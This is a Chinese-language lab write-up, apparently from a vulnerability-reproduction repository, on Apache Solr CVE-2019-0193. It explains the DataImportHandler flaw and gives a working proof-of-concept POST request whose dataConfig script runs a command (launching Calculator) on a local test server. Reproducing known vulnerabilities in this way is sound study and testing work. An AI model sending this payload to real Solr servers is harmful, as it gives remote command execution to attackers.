## Apache Solr CVE-2019-0193漏洞 

漏洞分析请参考： [https://mp.weixin.qq.com/s/typLOXZCev_9WH_Ux0s6oA](https://mp.weixin.qq.com/s/typLOXZCev_9WH_Ux0s6oA) 

针对Solr环境配置参考：  


### 1. 漏洞说明

2019年8月1日，Apache Solr官方发布了CVE-2019-0193漏洞预警，漏洞危害评级为严重。  

此次漏洞出现在Apache Solr的DataImportHandler，该模块是一个可选但常用的模块，用于从数据库和其他源中提取数据。它具有一个功能，其中所有的DIH配置都可以通过外部请求的dataConfig参数来设置。由于DIH配置可以包含脚本，因此攻击者可以通过构造危险的请求，从而造成远程命令执行。  

**关键原因**  
该漏洞的产生是由于两方面的原因：  
1. 用户在solrconfig.xml文件中设置了DataImportHandler，开启了DataImport功能。  
2. DataImportHandler模块允许用户自己包含脚本，来进行配置。

**影响版本**  
Apache Solr < 8.2.0

### 2. 漏洞验证开启DataImport功能

在创建的Core项目的solrconfig.xml中配置dataimport requestHandler：  

	  <luceneMatchVersion>6.6.0</luceneMatchVersion>
	  <!-- CVE-1029-0193 漏洞，环境配置，需要配置dataimport -->
	  <requestHandler name="/dataimport" class="solr.DataImportHandler" >
	  </requestHandler>

### 3. 通过dataimport接口，发送执行恶意代码

通过POST方法，发送以下POC代码：  

	POST /solr/new_core/dataimport HTTP/1.1
	Host: localhost:8080
	User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0
	Content-type: application/x-www-form-urlencoded
	Referer: http://localhost:8080/solr/index.html
	doNotIntercept: true
	Connection: close
	Content-Length: 454

	command=full-import&dataConfig=
	<dataConfig>
	<dataSource type="URLDataSource"/>
  	<script><![CDATA[ java.lang.Runtime.getRuntime().exec("/Applications/Calculator.app/Contents/MacOS/Calculator");
  	]]></script>
  	<document>
    	<entity name="a"
            url="https://stackoverflow.com/feeds/tag/solr"
            processor="XPathEntityProcessor"
            forEach="/feed"
            transformer="script:" />
  	</document>
	</dataConfig>


**执行成功**   

![](https://github.com/shadow-horse/Vulenvironment/blob/master/solr/img/calc.png)

